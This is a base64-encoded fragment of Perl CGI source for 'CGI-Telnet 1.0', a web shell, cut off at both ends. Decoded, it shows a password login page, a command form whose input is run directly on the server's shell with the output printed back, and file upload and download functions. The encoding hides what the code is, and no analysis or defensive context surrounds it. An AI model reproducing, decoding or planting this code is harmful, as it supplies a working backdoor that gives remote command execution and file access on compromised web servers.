woJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8dGl0bGU+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMDwvdGl0bGU+CiRIdG1sTWV0YUhlYWRlcgo8L2hlYWQ+Cjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMDAwMDAwIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPgo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4KPHRyPgo8dGQgYmdjb2xvcj0iI0MyQkZBNSIgYm9yZGVyY29sb3I9IiMwMDAwODAiIGFsaWduPSJjZW50ZXIiPgo8Yj48Zm9udCBjb2xvcj0iIzAwMDA4MCIgc2l6ZT0iMiI+IzwvZm9udD48L2I+PC90ZD4KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjRkZGRkZGIj48Yj5DR0ktVGVsbmV0IFZlcnNpb24gMS4wIC0gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9udD48L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjQzJCRkE1Ij48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8CjxhIGhyZWY9Imh0dHA6Ly93d3cucm9oaXRhYi5jb20vY2dpc2NyaXB0cy9jZ2l0ZWxuZXQuaHRtbCI+SGVscDwvYT4KPC9mb250PjwvdGQ+CjwvdHI+CjwvdGFibGU+Cjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjNjY5OTk5Ij4gX19fX18gIF9fX19fICBfX19fXyAgICAgICAgICBfX19fXyAgICAgICAgXyAgICAgICAgICAgICAgIF8KLyAgX18gXHwgIF9fIFx8XyAgIF98ICAgICAgICB8XyAgIF98ICAgICAgfCB8ICAgICAgICAgICAgIHwgfAp8IC8gIFwvfCB8ICBcLyAgfCB8ICAgX19fX19fICAgfCB8ICAgIF9fXyB8IHwgXyBfXyAgICBfX18gfCB8Xwp8IHwgICAgfCB8IF9fICAgfCB8ICB8X19fX19ffCAgfCB8ICAgLyBfIFx8IHx8ICdfIFwgIC8gXyBcfCBfX3wKfCBcX18vXHwgfF9cIFwgX3wgfF8gICAgICAgICAgIHwgfCAgfCAgX18vfCB8fCB8IHwgfHwgIF9fL3wgfF8KIFxfX19fLyBcX19fXy8gXF9fXy8gICAgICAgICAgIFxfLyAgIFxfX198fF98fF98IHxffCBcX19ffCBcX198IDEuMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgPC9mb250Pjxmb250IGNvbG9yPSIjQUU4MzAwIj7CqSAyMDAxLCBSb2hpdGFiIEJhdHJhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgICAgICAgICAgICAgIC4tJnF1b3Q7ICAgICAgJnF1b3Q7LS4KICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICB8CiAgICAgICAgICAgICAgICAgfCwgIC4tLiAgLi0uICAsfAogICAgICAgICAgICAgICAgIHwgKShfby8gIFxvXykoIHwKICAgICAgICAgICAgICAgICB8LyAgICAgL1wgICAgIFx8CiAgICAgICAoQF8gICAgICAgKF8gICAgIF5eICAgICBfKQogIF8gICAgICkgXDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+XDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnxJSUlJSUl8PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+LzwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fX19fX19fX19fX19fX19fX18KPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gKF8pPC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5AOEA4PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj57fTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+Jmx0O19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58LVxJSUlJSUkvLXw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fXyZndDs8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPgogICAgICAgIClfLyAgICAgICAgXCAgICAgICAgICAvIAogICAgICAgKEAgICAgICAgICAgIGAtLS0tLS0tLWAKICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+VyBBIFIgTiBJIE4gRzogUHJpdmF0ZSBTZXJ2ZXI8L2ZvbnQ+PC9wcmU+CiQ7CiMnCglwcmludCA8PEVORDsKPGNvZGU+ClRyeWluZyAkU2VydmVyTmFtZS4uLjxicj4KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPgpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dCjxjb2RlPiRNZXNzYWdlCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxicj5sb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5Gb3JtCnsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CmxvZ2luOiBhZG1pbjxicj4KcGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlRm9vdGVyCnsKCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ291dAp7CglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkmUHJpbnRMb2dvdXRTY3JlZW47CgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QKIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoJCX0KCQkmUHJpbnRMb2dpbkZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPgokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjwvZm9ybT4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KJFByb21wdCB1cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bwojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgo8Y29kZT4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLgo8YnI+S2lsbGVkIGl0IQo8Y29kZT4KRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOwoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7Cgl9CgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsKCQlpZighJFdpbk5UKQoJCXsKCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsKCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJCX0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkCgkJewoJCQkkfD0xOwoJCQkkQ29tbWFuZCAuPSAiIHwiOwoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQoJCQl7CgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJCXByaW50ICIkX1xuIjsKCQkJfQoJCQkkfD0wOwoJCX0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMKCQl7CgkJCXByaW50IGAkQ29tbWFuZGA7CgkJfQoJCWlmKCEkV2luTlQpCgkJewoJCQlhbGFybSgwKTsKCQl9CgkJcHJpbnQgIjwveG1wPiI7Cgl9CgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcgojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaAojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlCnsKCWxvY2FsKCRGaWxlVXJsKSA9IEBfOwoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzCgl7CgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3NlcgoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7CgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1